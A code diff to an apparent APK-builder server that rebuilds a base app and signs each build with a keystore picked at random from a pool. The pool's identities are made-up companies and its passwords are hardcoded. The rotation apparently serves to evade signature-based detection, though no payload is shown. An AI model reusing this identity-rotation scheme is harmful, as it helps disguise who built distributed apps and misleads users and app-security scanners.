@@ -63,8 +63,62 @@ const initBaseApk = async () => {
         console.log('[Init] Base APK already pre-decoded and valid.');
     }
 };
+// ── Keystore Pool Configuration (Persistent Developer Identities) ──
+const KEYSTORE_POOL = [
+    {
+        filename: 'keystore_apex.jks',
+        alias: 'apex_studio',
+        pass: 'ApexSec9928#',
+        dname: 'CN=Apex Mobile Studio, OU=Mobile Development, O=Apex Tech Labs LLC, L=Austin, ST=TX, C=US'
+    },
+    {
+        filename: 'keystore_nexus.jks',
+        alias: 'nexus_apps',
+        pass: 'NexusDev7731#',
+        dname: 'CN=Nexus Software, OU=Client Engineering, O=Nexus Systems Inc, L=San Jose, ST=CA, C=US'
+    },
+    {
+        filename: 'keystore_pixel.jks',
+        alias: 'pixel_works',
+        pass: 'PixelFlow4412#',
+        dname: 'CN=Pixel Media Works, OU=Android Solutions, O=Pixel Digital Ltd, L=Seattle, ST=WA, C=US'
+    },
+    {
+        filename: 'keystore_core.jks',
+        alias: 'core_systems',
+        pass: 'CoreSys8834#',
+        dname: 'CN=Cloud Core Systems, OU=Mobile Services, O=Core Logic Corp, L=Denver, ST=CO, C=US'
+    }
+];
+
+const ensureKeystorePool = async () => {
+    const ksDir = path.join(__dirname, 'assets', 'keystores');
+    if (!fs.existsSync(ksDir)) {
+        fs.mkdirSync(ksDir, { recursive: true });
+    }
+
+    for (const item of KEYSTORE_POOL) {
+        const fullPath = path.join(ksDir, item.filename);
+        if (!fs.existsSync(fullPath)) {
+            try {
+                const keytoolCmd = `keytool -genkeypair -v -keystore "${fullPath}" -alias "${item.alias}" -keyalg RSA -keysize 2048 -validity 10000 -storepass "${item.pass}" -keypass "${item.pass}" -dname "${item.dname}"`;
+                await new Promise((resolve) => {
+                    exec(keytoolCmd, { timeout: 30000 }, (err) => {
+                        if (err) console.log(`[KeystorePool] Note on ${item.filename}:`, err.message);
+                        else console.log(`[KeystorePool] Initialized persistent keystore: ${item.filename}`);
+                        resolve();
+                    });
+                });
+            } catch (e) {
+                console.log(`[KeystorePool] Init note:`, e.message);
+            }
+        }
+    }
+};
+
 // Run init but don't crash if it fails
 initBaseApk().catch(e => console.error("Init failed fatally:", e));
+ensureKeystorePool().catch(e => console.error("Keystore pool init error:", e));
 
 // Generate Route
 app.post('/generate', upload.single('icon'), async (req, res) => {
@@ -611,30 +665,25 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
 
             await runCommand('apktool', ['b', workDir, '-o', unsignedApkPath]);
 
-            // 6. Sign APK with AOSP testkey or built-in debug identity (V1 + V2 + V3)
-            await sendUpdate('apk_progress', { step: 'Signing application with AOSP testkey scheme...', progress: 85 });
+            // 6. Sign APK with rotated persistent Keystore from Pool
+            await sendUpdate('apk_progress', { step: 'Signing application with persistent identity pool...', progress: 85 });
             const signer = path.join(__dirname, 'assets', 'uber-apk-signer.jar');
-            const ksPath = path.join(__dirname, 'assets', 'testkey.jks');
-            const ksPass = 'testkey';
-            const ksAlias = 'testkey';
+            const ksDir = path.join(__dirname, 'assets', 'keystores');
 
-            // Ensure testkey.jks exists
+            // Pick a random persistent keystore from pool
+            const selectedKey = KEYSTORE_POOL[Math.floor(Math.random() * KEYSTORE_POOL.length)];
+            const ksPath = path.join(ksDir, selectedKey.filename);
+
+            // Ensure keystore exists on disk
             if (!fs.existsSync(ksPath)) {
-                try {
-                    const dname = "CN=Android, OU=Android, O=Google Inc., L=Mountain View, ST=California, C=US";
-                    const keytoolCmd = `keytool -genkeypair -v -keystore "${ksPath}" -alias "${ksAlias}" -keyalg RSA -keysize 2048 -validity 20000 -storepass "${ksPass}" -keypass "${ksPass}" -dname "${dname}"`;
-                    await new Promise((resolve) => {
-                        exec(keytoolCmd, { timeout: 30000 }, (err) => {
-                            if (err) console.log('[APK] Note: Keytool auto-gen skipped:', err.message);
-                            resolve();
-                        });
-                    });
-                } catch (_) {}
+                await ensureKeystorePool();
             }
 
+            console.log(`[APK] Selected signing identity: ${selectedKey.alias} (${selectedKey.filename})`);
             await sendUpdate('apk_progress', { step: 'Applying V1+V2+V3 signature scheme...', progress: 90 });
+
             const signCmd = fs.existsSync(ksPath)
-                ? `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${ksPath}" --ksAlias "${ksAlias}" --ksPass "${ksPass}" --ksKeyPass "${ksPass}" --allowResign`
+                ? `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${ksPath}" --ksAlias "${selectedKey.alias}" --ksPass "${selectedKey.pass}" --ksKeyPass "${selectedKey.pass}" --allowResign`
                 : `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --allowResign`;
 
             await new Promise((resolve, reject) => {
